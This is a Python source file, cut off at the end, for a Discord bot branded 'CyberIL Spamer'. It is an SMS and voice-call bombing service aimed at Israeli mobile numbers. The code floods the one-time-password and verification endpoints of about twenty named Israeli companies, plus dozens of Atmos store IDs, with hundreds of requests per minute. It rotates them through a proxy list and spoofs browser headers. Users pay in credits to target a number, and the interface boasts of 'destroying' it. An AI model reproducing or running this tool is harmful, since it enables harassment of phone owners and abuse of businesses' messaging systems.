import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import time
import random
import uuid
import aiohttp
from motor.motor_asyncio import AsyncIOMotorClient
import logging
import re
import sys
import os
from datetime import datetime, timezone, timedelta
import certifi
import socket
from collections import defaultdict
import itertools

# ============ CONFIGURATION ============
TOKEN = os.getenv("DISCORD_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")
DB_NAME = "CyberIL_Spamer"
WEBHOOK_URL = ""

PANEL_CHANNEL = 1481957038241353779
GIFT_CHANNEL = 1485104425625325709

OWNER_ID = 589866832069132308
STAFF_ROLE_ID = 1480424913985732732

COOLDOWN_TIME = 20
MAX_CREDIT_SPEND = 100
LAUNCH_DELAY = 3

COLOR_MAIN = 0x5865F2
COLOR_SUCCESS = 0x57F287
COLOR_DANGER = 0xED4245
COLOR_WARNING = 0xFEE75C
COLOR_INFO = 0x5865F2

# ============ PROXY LIST - 18 Israeli Proxies ============
PROXIES = [
    {"ip": "51.85.49.118", "port": 2887, "protocol": "socks5", "anonymity": "anonymous", "latency": 661},
    {"ip": "51.85.49.118", "port": 43593, "protocol": "socks5", "anonymity": "transparent", "latency": 293},
    {"ip": "51.85.49.118", "port": 8730, "protocol": "socks5", "anonymity": "transparent", "latency": 276},
    {"ip": "51.85.49.118", "port": 39907, "protocol": "socks5", "anonymity": "transparent", "latency": 275},
    {"ip": "51.85.49.118", "port": 59524, "protocol": "socks5", "anonymity": "transparent", "latency": 257},
    {"ip": "51.85.49.118", "port": 32070, "protocol": "socks5", "anonymity": "transparent", "latency": 233},
    {"ip": "51.85.49.118", "port": 9267, "protocol": "socks5", "anonymity": "transparent", "latency": 245},
    {"ip": "51.85.49.118", "port": 50918, "protocol": "socks5", "anonymity": "transparent", "latency": 321},
    {"ip": "51.85.49.118", "port": 10164, "protocol": "socks5", "anonymity": "transparent", "latency": 258},
    {"ip": "51.85.49.118", "port": 8053, "protocol": "socks5", "anonymity": "transparent", "latency": 303},
    {"ip": "51.85.49.118", "port": 22901, "protocol": "socks5", "anonymity": "transparent", "latency": 782},
    {"ip": "51.85.49.118", "port": 8874, "protocol": "socks5", "anonymity": "transparent", "latency": 987},
    {"ip": "51.85.49.118", "port": 35524, "protocol": "socks5", "anonymity": "transparent", "latency": 990},
    {"ip": "51.85.49.118", "port": 39220, "protocol": "socks5", "anonymity": "transparent", "latency": 256},
    {"ip": "51.85.49.118", "port": 27905, "protocol": "socks5", "anonymity": "transparent", "latency": 316},
    {"ip": "51.85.49.118", "port": 2611, "protocol": "socks5", "anonymity": "transparent", "latency": 307},
    {"ip": "51.85.49.118", "port": 8050, "protocol": "socks5", "anonymity": "transparent", "latency": 306},
    {"ip": "51.85.49.118", "port": 176, "protocol": "socks5", "anonymity": "transparent", "latency": 258},
]

PROXY_URLS = [f"{p['protocol']}://{p['ip']}:{p['port']}" for p in PROXIES]
PROXY_CYCLE = itertools.cycle(PROXY_URLS)

def get_next_proxy():
    """מחזיר פרוקסי הבא בתור"""
    return next(PROXY_CYCLE)

# ============ BOT SETUP ============
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True

client = commands.Bot(command_prefix="!", intents=intents, heartbeat_timeout=60)
tree = client.tree

# ============ DATABASE ============
mongo_connection = AsyncIOMotorClient(MONGO_URI, tlsCAFile=certifi.where())
database = mongo_connection[DB_NAME]
users_collection = database["users"]
cooldown_collection = database["cooldowns"]
settings_collection = database["settings"]
logs_collection = database["attack_logs"]
lifetime_collection = database["lifetime"]

logging.basicConfig(level=logging.WARNING)

# ============ GLOBAL VARIABLES ============
active_missions = {}
cooldown_tracker = {}
is_shutting_down = False
stop_all_event = asyncio.Event()
api_stats = defaultdict(int)

BROWSER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/145.0.0.0 Safari/537.36",
]

def random_agent():
    return random.choice(BROWSER_AGENTS)

async def get_client_ip():
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        return ip
    except:
        return "unknown"

def is_staff(interaction: discord.Interaction) -> bool:
    if interaction.user.id == OWNER_ID:
        return True
    role = interaction.guild.get_role(STAFF_ROLE_ID)
    if role and role in interaction.user.roles:
        return True
    return False

def is_owner(interaction: discord.Interaction) -> bool:
    return interaction.user.id == OWNER_ID

# ============ DATABASE FUNCTIONS ============
async def fetch_balance(user_id: int) -> int:
    record = await users_collection.find_one({"_id": user_id})
    if not record:
        return 0
    if record.get("unlimited"):
        return 999999
    return record.get("credits", 0)

async def has_unlimited(user_id: int) -> bool:
    record = await users_collection.find_one({"_id": user_id})
    if record and record.get("unlimited"):
        return True
    lifetime_record = await lifetime_collection.find_one({"_id": user_id})
    if lifetime_record:
        expires_at = lifetime_record.get("expires_at", 0)
        if expires_at == 0 or expires_at > time.time():
            return True
        else:
            await lifetime_collection.delete_one({"_id": user_id})
    return False

async def format_balance(user_id: int) -> str:
    if await has_unlimited(user_id):
        lifetime_record = await lifetime_collection.find_one({"_id": user_id})
        if lifetime_record and lifetime_record.get("expires_at", 0) > 0:
            remaining = int(lifetime_record["expires_at"] - time.time())
            days = remaining // 86400
            hours = (remaining % 86400) // 3600
            return f"ללא הגבלה ({days} ימים {hours} שעות)"
        return "ללא הגבלה"
    return str(await fetch_balance(user_id))

async def add_credits(user_id: int, amount: int):
    await users_collection.update_one({"_id": user_id}, {"$inc": {"credits": amount}}, upsert=True)

async def remove_credits(user_id: int, amount: int):
    await users_collection.update_one({"_id": user_id}, {"$inc": {"credits": -amount}}, upsert=True)

async def set_lifetime(user_id: int, duration_seconds: int = None):
    if duration_seconds is None:
        await lifetime_collection.update_one({"_id": user_id}, {"$set": {"expires_at": 0}}, upsert=True)
    else:
        await lifetime_collection.update_one({"_id": user_id}, {"$set": {"expires_at": time.time() + duration_seconds}}, upsert=True)

async def remove_lifetime(user_id: int):
    await lifetime_collection.delete_one({"_id": user_id})

async def use_credit(user_id: int) -> bool:
    if await has_unlimited(user_id):
        return True
    result = await users_collection.update_one({"_id": user_id, "credits": {"$gte": 1}}, {"$inc": {"credits": -1}})
    return result.modified_count == 1

async def check_cooldown(target: str):
    record = await cooldown_collection.find_one({"target": target})
    if not record:
        return False, 0
    elapsed = time.time() - record["last_attempt"]
    if elapsed < COOLDOWN_TIME:
        return True, int(COOLDOWN_TIME - elapsed)
    return False, 0

async def apply_cooldown(target: str):
    await cooldown_collection.update_one({"target": target}, {"$set": {"last_attempt": time.time()}}, upsert=True)

async def save_log(user_id: int, username: str, phone: str, cost: int, success: int, failed: int, duration: int, ip: str):
    await logs_collection.insert_one({
        "user_id": user_id, "username": username, "phone": phone, "cost": cost,
        "success_count": success, "failed_count": failed, "total": success + failed,
        "duration": duration, "ip": ip, "timestamp": datetime.now(timezone.utc),
        "date": datetime.now(timezone.utc).strftime("%Y-%m-%d"),
        "time": datetime.now(timezone.utc).strftime("%H:%M:%S")
    })

# ============ REQUEST WITH PROXY ============
async def send_request_with_proxy(session, url, form=None, json_data=None, headers_extra=None, tag="", method="POST", data=None):
    """שולח בקשה דרך פרוקסי"""
    headers = {
        "User-Agent": random_agent(),
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
    }
    if headers_extra:
        headers.update(headers_extra)
    
    proxy_url = get_next_proxy()
    
    try:
        timeout = aiohttp.ClientTimeout(total=3)
        if method == "GET":
            async with session.get(url, headers=headers, timeout=timeout, ssl=False, proxy=proxy_url) as resp:
                await resp.read()
                return resp.status < 500, tag
        elif json_data is not None:
            headers.setdefault("Content-Type", "application/json")
            async with session.post(url, json=json_data, headers=headers, timeout=timeout, ssl=False, proxy=proxy_url) as resp:
                await resp.read()
                return resp.status < 500, tag
        elif data is not None:
            async with session.post(url, data=data, headers=headers, timeout=timeout, ssl=False, proxy=proxy_url) as resp:
                await resp.read()
                return resp.status < 500, tag
        elif form is not None:
            async with session.post(url, data=form, headers=headers, timeout=timeout, ssl=False, proxy=proxy_url) as resp:
                await resp.read()
                return resp.status < 500, tag
        else:
            async with session.post(url, headers=headers, timeout=timeout, ssl=False, proxy=proxy_url) as resp:
                await resp.read()
                return resp.status < 500, tag
    except:
        return False, tag

# ============ ATMOS ============
async def atmos_request(session, store_id, phone, is_call=False):
    tag = f"atmos-{store_id}-call" if is_call else f"atmos-{store_id}"
    fd = aiohttp.FormData()
    fd.add_field("restaurant_id", store_id)
    fd.add_field("phone", phone)
    fd.add_field("testing", "false")
    h = {
        "User-Agent": random_agent(),
        "accept": "application/json, text/plain, */*",
        "accept-language": "he-IL,he;q=0.9",
        "origin": "https://order.atmos.rest",
        "referer": "https://order.atmos.rest/",
    }
    proxy_url = get_next_proxy()
    try:
        endpoint = "sendValidationCall" if is_call else "sendValidationCode"
        async with session.post(f"https://api-ns.atmos.co.il/rest/{store_id}/auth/{endpoint}", data=fd, headers=h, timeout=3, ssl=False, proxy=proxy_url) as resp:
            await resp.read()
            return resp.status < 500, tag
    except:
        return False, tag

# ============ ALL APIS ============
async def citycar_request(session, phone):
    tag = "CityCar"
    formatted = f"+972{phone[1:]}" if phone.startswith("0") else f"+972{phone}"
    payload = {"phoneNumber": formatted, "verifyChannel": 0, "loginOrRegister": 2}
    headers = {"Content-Type": "application/json", "Origin": "https://citycar.co.il", "Referer": "https://citycar.co.il/"}
    return await send_request_with_proxy(session, "https://proxy1.citycar.co.il/api/verify/login", json_data=payload, headers_extra=headers, tag=tag)

async def joedelek_request(session, phone):
    tag = "JoeDelek"
    url = f"https://www.joedelek.co.il/loginpage?action=joegetcode&phone={phone}"
    headers = {"Referer": "https://www.joedelek.co.il/", "X-Requested-With": "XMLHttpRequest"}
    return await send_request_with_proxy(session, url, method="GET", headers_extra=headers, tag=tag)

async def golbary_request(session, phone):
    tag = "Golbary"
    form_data = f"form_key=wXy2exQIpPdSQGlJ&bot_validation=1&type=login&telephone={phone}&code=&compare_email=&compare_identity="
    headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.golbary.co.il", "Referer": "https://www.golbary.co.il/"}
    return await send_request_with_proxy(session, "https://www.golbary.co.il/customer/ajax/post/", form=form_data, headers_extra=headers, tag=tag)

async def lilit_request(session, phone):
    tag = "Lilit"
    form_data = f"form_key=ZU3OFGsYFtuFztWP&bot_validation=1&type=login&telephone={phone}&code=&compare_email=&compare_identity="
    headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.lilit.co.il", "Referer": "https://www.lilit.co.il/"}
    return await send_request_with_proxy(session, "https://www.lilit.co.il/customer/ajax/post/", form=form_data, headers_extra=headers, tag=tag)

async def noizz_request(session, phone):
    tag = "Noizz"
    form_data = f"form_key=gG3PDFmko69r8EXk&bot_validation=1&type=login&telephone={phone}&code=&compare_email=&compare_identity="
    headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.noizz.co.il", "Referer": "https://www.noizz.co.il/"}
    return await send_request_with_proxy(session, "https://www.noizz.co.il/customer/ajax/post/", form=form_data, headers_extra=headers, tag=tag)

async def payngo_request(session, phone):
    tag = "Payngo"
    form_data = f"telephone={phone}&form_key=KORwS4ytkSbaOFf7"
    headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.payngo.co.il", "Referer": "https://www.payngo.co.il/customer/account/create/"}
    return await send_request_with_proxy(session, "https://www.payngo.co.il/login/init/phone/", form=form_data, headers_extra=headers, tag=tag)

async def electra_air_request(session, phone):
    tag = "ElectraAir"
    form_data = f"action=validate_phone_otp&company=2&otp={phone}"
    headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.electra-air.co.il", "Referer": "https://www.electra-air.co.il/"}
    return await send_request_with_proxy(session, "https://www.electra-air.co.il/wp-admin/admin-ajax.php", form=form_data, headers_extra=headers, tag=tag)

async def housemen_request(session, phone):
    tag = "Housemen"
    form_data = f"action=simply-check-member-cellphone&cellphone={phone}"
    headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://housemen.co.il", "Referer": "https://housemen.co.il/"}
    return await send_request_with_proxy(session, "https://housemen.co.il/wp-admin/admin-ajax.php", form=form_data, headers_extra=headers, tag=tag)

async def freeivr_request(session, phone):
    tag = "FreeIVR"
    formatted = f"972{phone[1:]}" if phone.startswith("0") else f"972{phone}"
    payload = {"action": "Send", "phone": formatted}
    headers = {"Content-Type": "application/json", "Origin": "https://f2.freeivr.co.il", "Referer": "https://f2.freeivr.co.il/register"}
    return await send_request_with_proxy(session, "https://f2.freeivr.co.il/api/v3/plugins/MitMValidPhone", json_data=payload, headers_extra=headers, tag=tag)

async def mitmachim_request(session, phone):
    tag = "Mitmachim"
    payload = {"action": "Send", "phone": phone}
    headers = {"Content-Type": "application/json", "Origin": "https://mitmachim.top", "Referer": "https://mitmachim.top/register"}
    return await send_request_with_proxy(session, "https://mitmachim.top/api/v3/plugins/MitMValidPhone", json_data=payload, headers_extra=headers, tag=tag)

async def netfree_request(session, phone):
    tag = "Netfree"
    formatted = f"+972{phone[1:]}" if phone.startswith("0") else f"+972{phone}"
    payload = {"agreeTou": True, "phone": formatted}
    headers = {"Content-Type": "application/json", "Origin": "https://netfree.link", "Referer": "https://netfree.link/welcome/"}
    return await send_request_with_proxy(session, "https://netfree.link/api/user/verify-phone/get-call", json_data=payload, headers_extra=headers, tag=tag)

async def oshioshi_request(session, phone):
    tag = "Oshioshi"
    form_data = f"phone={phone}"
    headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://delivery.oshioshi.co.il", "Referer": "https://delivery.oshioshi.co.il/he/"}
    return await send_request_with_proxy(session, "https://delivery.oshioshi.co.il/he/auth/register-send-code", form=form_data, headers_extra=headers, tag=tag)

async def freetv_request(session, phone):
    tag = "FreeTV"
    formatted = f"+972{phone[1:]}" if phone.startswith("0") else f"+972{phone}"
    payload = {"msisdn": formatted}
    headers = {"Content-Type": "application/json", "Origin": "https://freetv.tv", "Referer": "https://freetv.tv/"}
    return await send_request_with_proxy(session, "https://middleware.freetv.tv/api/v1/send-verification-sms", json_data=payload, headers_extra=headers, tag=tag)

async def webcut_request(session, phone):
    tag = "Webcut"
    payload = {"type": "otp", "data": {"phone": phone}}
    headers = {"Content-Type": "application/json"}
    return await send_request_with_proxy(session, "https://us-central1-webcut-2001a.cloudfunctions.net/sendWhatsApp", json_data=payload, headers_extra=headers, tag=tag)

async def pelephone_request(session, phone):
    tag = "Pelephone"
    payload = {"phone": phone, "terms": True, "appId": "DIGITALMy"}
    headers = {"Content-Type": "application/json", "Origin": "https://www.pelephone.co.il", "Referer": "https://www.pelephone.co.il/login/?u=DIGITALMy"}
    return await send_request_with_proxy(session, "https://www.pelephone.co.il/login/api/login/otpphone/", json_data=payload, headers_extra=headers, tag=tag)

async def cellcom_request(session, phone):
    tag = "Cellcom"
    payload = {"phone": phone}
    headers = {"Content-Type": "application/json", "Origin": "https://www.cellcom.co.il", "Referer": "https://www.cellcom.co.il/"}
    return await send_request_with_proxy(session, "https://www.cellcom.co.il/api/auth/sms", json_data=payload, headers_extra=headers, tag=tag)

async def shufersal_request(session, phone):
    tag = "Shufersal"
    payload = {"phone": phone}
    headers = {"Content-Type": "application/json", "Origin": "https://www.shufersal.co.il", "Referer": "https://www.shufersal.co.il/"}
    return await send_request_with_proxy(session, "https://www.shufersal.co.il/api/v1/auth/otp", json_data=payload, headers_extra=headers, tag=tag)

async def ramilevy_request(session, phone):
    tag = "RamiLevy"
    payload = {"phone": phone}
    headers = {"Content-Type": "application/json", "Origin": "https://www.rami-levy.co.il", "Referer": "https://www.rami-levy.co.il/"}
    return await send_request_with_proxy(session, "https://www.rami-levy.co.il/api/auth/sms", json_data=payload, headers_extra=headers, tag=tag)

async def mcdonalds_request(session, phone):
    tag = "McDonalds"
    payload = {"phone": phone}
    headers = {"Content-Type": "application/json", "Origin": "https://www.mcdonalds.co.il", "Referer": "https://www.mcdonalds.co.il/"}
    return await send_request_with_proxy(session, "https://www.mcdonalds.co.il/api/verify", json_data=payload, headers_extra=headers, tag=tag)

async def burgerking_request(session, phone):
    tag = "BurgerKing"
    payload = {"phone": phone}
    headers = {"Content-Type": "application/json", "Origin": "https://www.burgerking.co.il", "Referer": "https://www.burgerking.co.il/"}
    return await send_request_with_proxy(session, "https://www.burgerking.co.il/api/auth", json_data=payload, headers_extra=headers, tag=tag)

async def dominos_request(session, phone):
    tag = "Dominos"
    payload = {"phone": phone}
    headers = {"Content-Type": "application/json", "Origin": "https://www.dominos.co.il", "Referer": "https://www.dominos.co.il/"}
    return await send_request_with_proxy(session, "https://www.dominos.co.il/api/auth/sms", json_data=payload, headers_extra=headers, tag=tag)

# ============ API CHECK FUNCTION ============
async def check_all_apis():
    """בודק את כל ה-APIs ומחזיר תוצאות"""
    results = []
    test_phone = "0506500708"
    connector = aiohttp.TCPConnector(limit=100)
    
    async with aiohttp.ClientSession(connector=connector) as s:
        api_tests = [
            ("CityCar", citycar_request(s, test_phone)),
            ("JoeDelek", joedelek_request(s, test_phone)),
            ("Golbary", golbary_request(s, test_phone)),
            ("Lilit", lilit_request(s, test_phone)),
            ("Noizz", noizz_request(s, test_phone)),
            ("Payngo", payngo_request(s, test_phone)),
            ("ElectraAir", electra_air_request(s, test_phone)),
            ("Housemen", housemen_request(s, test_phone)),
            ("FreeIVR", freeivr_request(s, test_phone)),
            ("Mitmachim", mitmachim_request(s, test_phone)),
            ("Netfree", netfree_request(s, test_phone)),
            ("Oshioshi", oshioshi_request(s, test_phone)),
            ("FreeTV", freetv_request(s, test_phone)),
            ("Webcut", webcut_request(s, test_phone)),
            ("Pelephone", pelephone_request(s, test_phone)),
            ("Cellcom", cellcom_request(s, test_phone)),
            ("Shufersal", shufersal_request(s, test_phone)),
            ("RamiLevy", ramilevy_request(s, test_phone)),
            ("McDonalds", mcdonalds_request(s, test_phone)),
            ("BurgerKing", burgerking_request(s, test_phone)),
            ("Dominos", dominos_request(s, test_phone)),
        ]
        
        tasks = [test for name, test in api_tests]
        api_names = [name for name, test in api_tests]
        
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        
        for i, resp in enumerate(responses):
            if isinstance(resp, Exception):
                results.append({"name": api_names[i], "status": False, "error": str(resp)[:50]})
            elif isinstance(resp, tuple) and len(resp) == 2:
                ok, name = resp
                results.append({"name": api_names[i], "status": ok})
            else:
                results.append({"name": api_names[i], "status": False})
    
    return results

# ============ MAIN SPAM FUNCTION ============
async def run_spam_batch(phone: str):
    raw = phone
    formatted = f"+972{raw[1:]}" if raw.startswith("0") else f"+972{raw}"
    sid = str(uuid.uuid4())
    random_email = f"user{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=6))}@gmail.com"
    
    connector = aiohttp.TCPConnector(limit=1000, ttl_dns_cache=300)
    async with aiohttp.ClientSession(connector=connector) as s:
        atmos_stores = ["1","2","3","4","5","7","8","13","15","18","21","23","24","27","28","29","33","35","48","51","56","57","59","2008","2011","2012","2014","2041","2052","2053","2056","2059","2063","2070","2073","2076","2078","2087","2088","2091"]
        
        tasks = []
        
        # ATMOS - 38 SMS + 38 CALL (76 בקשות)
        for store in atmos_stores:
            tasks.append(atmos_request(s, store, raw, False))
            tasks.append(atmos_request(s, store, raw, True))
        
        # ALL APIS
        tasks.extend([
            citycar_request(s, raw),
            joedelek_request(s, raw),
            golbary_request(s, raw),
            lilit_request(s, raw),
            noizz_request(s, raw),
            payngo_request(s, raw),
            electra_air_request(s, raw),
            housemen_request(s, raw),
            freeivr_request(s, raw),
            mitmachim_request(s, raw),
            netfree_request(s, raw),
            oshioshi_request(s, raw),
            freetv_request(s, raw),
            webcut_request(s, raw),
            pelephone_request(s, raw),
            cellcom_request(s, raw),
            shufersal_request(s, raw),
            ramilevy_request(s, raw),
            mcdonalds_request(s, raw),
            burgerking_request(s, raw),
            dominos_request(s, raw),
        ])
        
        all_res = await asyncio.gather(*tasks, return_exceptions=True)
        success = 0
        for r in all_res:
            if isinstance(r, Exception):
                continue
            elif isinstance(r, tuple):
                ok, name = r
                if ok:
                    success += 1
        return success

# ============ UI PANELS ============
def create_panel():
    embed = discord.Embed(title="💀 **CYBERIL SPAMER** 💀", description="**המערכת הקטלנית ביותר בישראל**\n> 50+ שירותים | SMS + CALL | 18 פרוקסי", color=0x8B0000)
    embed.add_field(name="🚀 **התחל ספאם**", value="```\n1. לחץ על התחל ספאם\n2. הזן מספר טלפון\n3. בחר כמות קרדיטים\n4. אשר והמתן להשמדה```", inline=False)
    embed.add_field(name="💎 **עלות**", value=f"```\nכל קרדיט = דקה אחת\nכל דקה = 200+ בקשות```", inline=False)
    embed.add_field(name="⚡ **מהירות**", value=f"```\n1000+ חיבורים במקביל\n18 פרוקסי ישראלים\nדיליי {COOLDOWN_TIME} שניות```", inline=False)
    embed.set_footer(text="💀 CYBERIL SPAMER - השמדה מוחלטת 💀")
    return embed

def create_gift_panel():
    embed = discord.Embed(title="🎁 **קרדיטים חינם** 🎁", description="```\nקבל קרדיט אחד כל 24 שעות```", color=0xFFD700)
    embed.add_field(name="🎯 **איך מקבלים?**", value="```\nלחץ על הכפתור למטה```", inline=False)
    embed.set_footer(text="💀 CYBERIL SPAMER 💀")
    return embed

# ============ VIEWS ============
class StopAttack(discord.ui.View):
    def __init__(self, user_id: int):
        super().__init__(timeout=None)
        self.user_id = user_id

    @discord.ui.button(label="⏹️ עצור ספאם", style=discord.ButtonStyle.danger, emoji="⏹️", custom_id="stop_attack")
    async def stop_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.user_id and not is_owner(interaction):
            await interaction.response.send_message("❌ לא הספאם שלך", ephemeral=True)
            return
        ev = active_missions.get(self.user_id)
        if ev:
            ev.set()
        button.disabled = True
        await interaction.response.edit_message(view=self)

class ConfirmAttack(discord.ui.View):
    def __init__(self, phone: str, cost: int, user_id: int):
        super().__init__(timeout=30)
        self.phone = phone
        self.cost = cost
        self.user_id = user_id
        self.is_running = False

    @discord.ui.button(label="💀 התחל השמדה 💀", style=discord.ButtonStyle.danger, emoji="💀", custom_id="confirm_attack")
    async def confirm_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.user_id:
            await interaction.response.send_message("❌ לא האישור שלך", ephemeral=True)
            return
        if self.is_running:
            await interaction.response.send_message("⚠️ הספאם כבר בתהליך", ephemeral=True)
            return
        self.is_running = True
        self.stop()
        await interaction.response.defer(ephemeral=True)
        
        for _ in range(self.cost):
            if not await use_credit(self.user_id):
                embed = discord.Embed(title="❌ אין מספיק קרדיטים", color=COLOR_DANGER)
                await interaction.edit_original_response(embed=embed, view=None)
                return

        stop_event = asyncio.Event()
        active_missions[self.user_id] = stop_event

        embed = discord.Embed(title="💀 השמדה בתהליך 💀", description=f"**{self.phone}** | **{self.cost} דקות**\n🔥 18 פרוקסי | 1000+ חיבורים", color=0x8B0000)
        await interaction.edit_original_response(embed=embed, view=StopAttack(self.user_id))

        total_success = 0
        start_time = time.time()
        end_time = start_time + (self.cost * 60)
        last_update = time.time()
        ip = await get_client_ip()

        try:
            while time.time() < end_time:
                if stop_event.is_set() or is_shutting_down or stop_all_event.is_set():
                    break
                success = await run_spam_batch(self.phone)
                total_success += success
                if time.time() - last_update >= 2:
                    remaining = max(0, int((end_time - time.time()) / 60))
                    rate = int(total_success / max(1, time.time() - start_time))
                    embed = discord.Embed(title="💀 השמדה בתהליך 💀", description=f"**{self.phone}** | נותר: {remaining} דקות\n\n✅ {total_success} בקשות | ⚡ {rate}/שנייה\n🔥 18 פרוקסי | 50+ שירותים", color=0x8B0000)
                    await interaction.edit_original_response(embed=embed, view=StopAttack(self.user_id))
                    last_update = time.time()
                await asyncio.sleep(0)

            await apply_cooldown(self.phone)
            active_missions.pop(self.user_id, None)
            stopped = stop_event.is_set() or stop_all_event.is_set()
            await save_log(user_id=self.user_id, username=str(interaction.user), phone=self.phone, cost=self.cost, success=total_success, failed=0, duration=self.cost * 60, ip=ip)
            bal = await format_balance(self.user_id)
            
            final = discord.Embed(title="💀 השמדה הושלמה 💀" if not stopped else "⏹️ השמדה הופסקה", color=0x8B0000 if not stopped else COLOR_WARNING)
            final.add_field(name="📱 יעד", value=self.phone, inline=True)
            final.add_field(name="⏱️ משך", value=f"{self.cost} דקות", inline=True)
            final.add_field(name="✅ בקשות", value=str(total_success), inline=True)
            final.add_field(name="💎 קרדיטים", value=bal, inline=True)
            final.add_field(name="🔥 פרוקסי", value="18", inline=True)
            await interaction.edit_original_response(embed=final, view=None)

        except Exception as e:
            active_missions.pop(self.user_id, None)
            await interaction.edit_original_response(embed=discord.Embed(title="❌ שגיאה", description=str(e)[:180], color=COLOR_DANGER), view=None)

    @discord.ui.button(label="❌ בטל", style=discord.ButtonStyle.secondary, emoji="❌", custom_id="cancel_attack")
    async def cancel_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.user_id:
            await interaction.response.send_message("❌ לא שלך", ephemeral=True)
            return
        self.stop()
        await interaction.response.edit_message(embed=discord.Embed(title="❌ בוטל", description="לא נוכו קרדיטים", color=COLOR_INFO), view=None)

class LaunchModal(discord.ui.Modal, title="התחל השמדה"):
    phone = discord.ui.TextInput(label="📱 מספר טלפון", placeholder="0501234567", min_length=9, max_length=13, style=discord.TextStyle.short)
    credits = discord.ui.TextInput(label="💎 כמות קרדיטים", placeholder="1-100", min_length=1, max_length=3, style=discord.TextStyle.short)

    async def on_submit(self, interaction: discord.Interaction):
        phone_num = self.phone.value.strip().replace("-", "").replace(" ", "").replace("+", "").replace("(", "").replace(")", "")
        if phone_num.startswith("972"):
            phone_num = phone_num[3:]
        if len(phone_num) == 9:
            phone_num = "0" + phone_num
        if len(phone_num) != 10 or not phone_num.startswith("05") or not phone_num.isdigit():
            await interaction.response.send_message(embed=discord.Embed(title="❌ שגיאה", description="מספר לא תקין!", color=COLOR_DANGER), ephemeral=True)
            return
        try:
            credits_num = int(self.credits.value.strip())
            if credits_num < 1 or credits_num > MAX_CREDIT_SPEND:
                raise ValueError
        except ValueError:
            await interaction.response.send_message(embed=discord.Embed(title="❌ שגיאה", description=f"כמות לא תקינה (1-{MAX_CREDIT_SPEND})", color=COLOR_DANGER), ephemeral=True)
            return
        uid = interaction.user.id
        bal = await fetch_balance(uid)
        unlimited = await has_unlimited(uid)
        if bal < credits_num and not unlimited:
            await interaction.response.send_message(embed=discord.Embed(title="❌ שגיאה", description=f"חסרים קרדיטים (יש: {bal}, צריך: {credits_num})", color=COLOR_DANGER), ephemeral=True)
            return
        on_cd, remain = await check_cooldown(phone_num)
        if on_cd:
            await interaction.response.send_message(embed=discord.Embed(title="⏱️ דיליי", description=f"המתן {remain} שניות", color=COLOR_WARNING), ephemeral=True)
            return
        bal_str = await format_balance(uid)
        confirm = discord.Embed(title="💀 אישור השמדה 💀", description=f"**יעד:** {phone_num}\n**משך:** {credits_num} דקות\n**עלות:** {credits_num} קרדיטים\n**יתרה:** {bal_str}\n\n🔥 18 פרוקסי | 1000+ חיבורים", color=0x8B0000)
        try:
            await interaction.response.send_message(embed=confirm, view=ConfirmAttack(phone=phone_num, cost=credits_num, user_id=uid), ephemeral=True)
        except discord.errors.NotFound:
            await interaction.followup.send(embed=confirm, view=ConfirmAttack(phone=phone_num, cost=credits_num, user_id=uid), ephemeral=True)

class MainPanel(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="💀 התחל השמדה 💀", style=discord.ButtonStyle.danger, emoji="💀", custom_id="start_spam")
    async def start_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        now = time.time()
        last = cooldown_tracker.get(interaction.user.id, 0)
        if now - last < LAUNCH_DELAY:
            await interaction.response.send_message(embed=discord.Embed(title="⏱️ דיליי", description=f"המתן {int(LAUNCH_DELAY - (now - last))} שניות", color=COLOR_WARNING), ephemeral=True)
            return
        cooldown_tracker[interaction.user.id] = now
        await interaction.response.send_modal(LaunchModal())

    @discord.ui.button(label="💎 הקרדיטים שלי", style=discord.ButtonStyle.primary, emoji="💎", custom_id="check_balance")
    async def balance_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        uid = interaction.user.id
        bal_str = await format_balance(uid)
        stats = await get_user_stats(uid)
        embed = discord.Embed(title="💎 הקרדיטים שלי", description=f"**{bal_str}**", color=COLOR_INFO)
        if stats:
            embed.add_field(name="📊 מתקפות", value=str(stats.get("total_attacks", 0)), inline=True)
            embed.add_field(name="✅ בקשות", value=str(stats.get("total_success", 0)), inline=True)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="📊 סטטוס", style=discord.ButtonStyle.secondary, emoji="📊", custom_id="stats")
    async def stats_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not is_staff(interaction):
            await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
            return
        await interaction.response.defer(ephemeral=True)
        stats = await get_global_stats()
        if not stats:
